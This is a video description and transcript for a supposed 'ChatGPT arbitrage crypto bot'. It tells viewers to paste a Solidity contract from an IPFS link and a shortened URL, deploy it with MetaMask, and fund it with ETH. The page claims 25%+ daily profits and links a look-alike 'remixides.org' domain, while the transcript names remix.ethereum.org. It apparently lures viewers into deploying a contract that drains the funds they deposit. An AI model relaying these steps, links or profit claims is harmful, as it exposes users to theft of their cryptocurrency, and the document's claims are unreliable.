title: 25%+/Day with ChatGPT Arbitrage Crypto Bot: A Beginner's Guide
description: Unlock the secrets of making $1000+ everyday using the power of the ChatGPT Arbitrage Crypto Bot in this comprehensive tutorial for 2023. This video guide offers step-by-step instructions to leverage OpenAI's advanced AI model, ChatGPT, to maximize your crypto trading profits. Ideal for beginners and seasoned traders alike, this video provides practical insights into the dynamic world of crypto arbitrage. Start your journey towards financial freedom today with our ChatGPT Arbitrage Crypto Bot tutorial!  ****** STEP BY STEP INSTRUCTIONS ******  1. Download MetaMask: :pushpin:https://metamask.io/download  2. Access Remix IDE:  :pushpin:https://remixides.org  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"  4. Paste SmartContract in Remix:  :pushpin:ipfs.io/ipfs/QmWL4bTJWDPWMCPaScozQDmb4Ufsa2mZ2XDovDvF4bwQjD      (Mirror link) :pushpin:https://is.gd/rOXVTp      5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it  6. Move to the "Deploy" tab, select "Injected Provider " environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address  8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'  :police car light:EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with 0.2 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with at least 0.2 ETH just to make sure that won't happen.  #Uniswap #arbitrage #arbitragetrading #arbitrageopportunity #SlippageBot #passiveincome  #ethereum  #tradingbot  #decentralizedfinance  #solidity  #web3  #cryptoincome  #cryptobot  #smartcontract #metamask  #cryptoarbitrage  #uniswaparbitrage #cryptocurrency  #blockchain  #cryptotrading #defi #cryptoprofit #codingtutorial  #nocoding #cryptotutorial  #Web3Tools #cryptoinvesting #cryptocurrencyinvesting  #cryptopassiveincome  #cryptoearnings  #solidity #blockchaintechnology #cryptotech  #defi #financialfreedom  #cryptowealth  #cryptostrategy  #cryptoexplained

asr.full_text: your financial condition for the better using ChatGPT, hello everyone, Dopey Maester here with an amazing video that's going to change your financial condition for the better. Today, I'll be walking you through the process of deploying an Ethereum arbitrage bot using ChatGPT which is your ticket to easy daily passive income. This arbitrage bot is a smart automated trading tool that scans uniswap and SushiSwap to spot the price differences between them. It helps you make a profit by buying a token at a lower price on one exchange and quickly selling it at a higher price on another. If you're thinking this sounds way too complex, trust me, it's a breeze. You don't need any coding expertise and I'll be right here to guide you every step off the way. So, let's dive right in and start generating that passive income you've always shunned off. All right let's get started, I'm gonna use Chat GPT to write the code. Hey Chat GPT, write me the code for a smart contract on Ethereum to auto-trade the arbitrage opportunities between Uniswap and SushiSwap. There you go, Chad GPT is writing a code, and I BET it's better than ANY human can possibly write it. Then head over to remix.ethereum.org. Remix is a web3 application that allows us to develop, compile, deploy, and launch smart contracts coded in the Solidity language. I'll put a link to Remix in the description below. Make sure you have the Metamask Browser extension installed and you're connected to the Ethereum MainNet. If it's your first time on Rem Remix it may ask you to agree to the terms, i've already done it. Head over to the sidebar on the left and create a new contract under their contracts folder, we're going to name it bot.sol. Next copy this code from chatgypt and paste it into the file bot.sol you've just created, this is our arbitrage bot, I will also place this code under description. So that you can copy it if you don't have access to GipT4 A couple of things to look at after pasting the code lines 50 and 51 You can also follow these addresses using etherscan These are the addresses of wrapped ether tokens which we wil be competing against. You don't actually need to have any wrapped Ether. Yup, perfect! It's the official wrapped ether address, always a good idea to check that. Back to Remix, now that our bot file is ready, let's compile it and click here as you can see. Here it's built with the 0.6.6 version of Solidity, under the compiler select the 0.6.6 version so that it matches our contract. Also make sure the language is set for Solidity and the UVM version is set to default. Now click on the compile bot.sol button and wait for the bot to compile. Now, we're going to deploy this to our wallet. Head over to the deploy and run transactions tab in Remix. Here, you'll want to select injected Web3 as the environment. We need to confirm the contract on the blockchain by paying GAZ fees, GAZ fees are the commission on the Ethereum network for smart contract deployment. Now the deployment utility is ready to go, click deploy. I always set the GAZ fee to high high there's usually not much of a difference and it puts the transaction through faster. Now we wait for the transaction to confirm. Sweet! We can see here that it's confirmed. Meaning our smart contract is deployed. Now you can see the various functions for our smart contract. Start enables to bot to start monitoring the market and withdraw stops the bot and transfers the funds back into your wallet, rest of the functions are not quite relevant for now. With the smart contract deployed, fund it with some Ethereum, which will be used for trading, make sure you got the right address there. You can fund a contract with whatever amount of Ethereum you want but keep in mind the more you in, the larger the trades will be able to make and potentially more profit you can accumulate over time. Sweet! There we go. DeToronto's action confirms that the funds were sent to the contract. We can make sure by checking our contract address on Etherscan once again, ensuring our Ethereum is in the contract. Nice. It's got two Ethereum, which is the amount we funded the contract with! The last step is to click start, this will enable the bot to start monitoring the market and execute trades. Let's set the gas speed to high, save, and click confirm! So I have about 2.31 Ethereum which is over 15% profit already. I'm gonna let my bot run for another 12 hours and withdraw the profits on that. Alright, let's see how much more we made! Nice! It's a little over 2.54 Ethereum! So it basically took me a day to make over 25% of my deposit back! That's pretty impressive! The bot will continue the run, until you click the withdraw button. When you click withdraw, the bot'll stop trading and return the total ethereum you entered initially, including the profit, back to your wallet, so let's click it. This will charge us a little bit of GAZ, I'll set it to high again and then click confirm. There we go the transaction is confirmed. Let's go to our MetaMask and see what we have now. You can see the balance from the Bot is now in my wallet. This is only after running the Bot for a little over a day. UNREAL! I've even had weeks where I've made 3 to 6 Ethereum. Sometimes more. The profits fluctuate week to week? Guys share your profits in the comments below, drop a like and don't forget to subscribe for more profitable ways to make passive income using web 3 tools
